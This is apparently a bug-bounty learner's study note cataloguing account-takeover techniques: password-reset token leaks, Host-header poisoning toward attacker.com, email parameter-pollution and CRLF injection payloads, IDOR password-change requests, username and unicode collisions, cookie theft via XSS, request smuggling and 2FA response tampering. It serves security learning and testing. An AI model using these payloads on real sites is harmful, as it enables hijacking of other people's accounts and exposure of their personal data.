`6 January 2023`
## **Day 20 What I Have Learned**
***
## **Account Takeover**:
- Originally Account Takeover (ATO) is an attack whereby cybercriminals take ownership of online accounts using stolen passwords and usernames.
- There are Many Ways To Takeover An Account e.g You can Takeover an Account Using Password Reset Techniques,which Do not require Username and Password.
- Account Takeover is a critical Vulnerability because In some cases There may personal information like (SSN,Personal Information) in the account.
***
## **Password Reset Attacks**
1. Password Reset Token Leak Via Referrer
- Request password reset to your email address
- Click on the password reset link & Don't change The password.
- Click any 3rd party websites(eg: Facebook, twitter).
- Intercept the request in Burp Suite proxy.
- Check if the referer header is leaking password reset token.
2. Account Takeover Through Password Reset Poisoning
- Intercept the password reset request in Burp Suite.
- Add or edit the following headers in Burp Suite : Host: attacker.com, X-Forwarded-Host: attacker.com.
- Forward the request with the modified header
``` js
POST https://example.com/reset.php HTTP/1.1
Accept: */*
Content-Type: application/json
Host: attacker.com
```
- Look for a password reset URL based on the host header like : https://attacker.com/reset-password.php?token=TOKEN
3. Password Reset Via Email Parameter
- The Password Reset Link is Likely to be sent to the Second provided email or Both if the website is Vulnerable.
 ``` js 
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
4. IDOR
- Attacker have to login with their account and go to the Change password feature.
- Start the Burp Suite and Intercept the request Then Send it to the repeater tab and edit the parameters : User ID/email
- Email:
``` js
POST /api/changepass
[...]
("form": {"email":"victim@email.com","password":"securepwd"})
(#Edit The Email To Your Victim's Email)
```
- ID:
``` js
POST /api/changepass id=455 (#Edit the Id number to your Victim one)
[...]
("form": {"email":"attacker@email.com","password":"securepwd"})
```
5. Weak Password Reset Token
- The password reset token should be randomly generated and unique every time. Try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. The following variables might be used by the algorithm.
  1. Timestamp
  2. UserID
  3. Email of User
  4. Firstname and Lastname
  5. Date of Birth
  6. Cryptography
  7. Number only
  8. Small token sequence (<6 characters between [A-Z,a-z,0-9])
  9. Token reuse
  10. Token expiration date
6. Password Reset Via Username Collision
- Register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: "Robin "
- Request a password reset with your malicious username.
- Use the token sent to your email and reset the victim password then Connect to the victim account with the new password.
7. Account takeover due to unicode normalization issue
- Victim account: demo@gmail.com
Attacker account: demⓞ@gmail.com
- [Tool Used To Unicode Characters](https://github.com/tomnomnom/hacks/tree/master/unisub).
- [Unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/)
## **Account Takeover Via Cross Site Scripting**
- Find an XSS inside the application or a subdomain if the cookies are scoped to the parent domain : *.domain.com
- Leak the current sessions cookie
- Authenticate as the user using the cookie
## **Account Takeover Via HTTP Request Smuggling**
1. Use smuggler to detect the type of HTTP Request Smuggling 
``` js
git clone https://github.com/defparam/smuggler.git
cd smuggler
python3 smuggler.py -h
```
2. Craft a request which will overwrite the POST / HTTP/1.1 with the following data:
``` js
GET http://something.burpcollaborator.net  HTTP/1.1
X: 
```
3. Final request could look like the following
``` js
GET /  HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X

```
## **2FA Bypasses**
1. Response Manipulation
- In response if "success":false Change it to "success":true
2. Status Code Manipulation
- If Status Code is 4xx Try to change it to 200 OK and see if it bypass restrictions
3. [More](https://github.com/Robinx33/365-Days-Challenge/blob/main/Day/Day%201_18%20December%202022.md).
***
## **Resources**
- [Flickr Account Takeover](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/).
- [10 Password Reset Flaws](https://anugrahsr.github.io/posts/10-Password-reset-flaws/).
- [$6,5k + $5k HTTP Request Smuggling mass account takeover - Slack + Zomato](https://www.youtube.com/watch?v=gzM4wWA7RFo).
- [Hacking Grindr Accounts with Copy and Paste](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/).
- [Account Takeover Via Reset Password](https://ashutoshmishra00x0.medium.com/account-takeover-via-reset-password-worth-2000-de085851d81d).
- [Full account takeover worth $1000 Think out of the box](https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7).
- [Account Takeovers Believe The Unbelievable](https://medium.com/bugbountywriteup/account-takeovers-believe-the-unbelievable-bb98a0c251a4).
## **Reports**
- [Mass account takeovers using HTTP Request Smuggling](https://hackerone.com/reports/737140) ($6,500).
- [Account takeover via leaked session cookie](https://hackerone.com/reports/745324) ($20,000).
- [Flickr Account Takeover using AWS Cognito API](https://hackerone.com/reports/1342088) ($7,550).

***
## **The End**
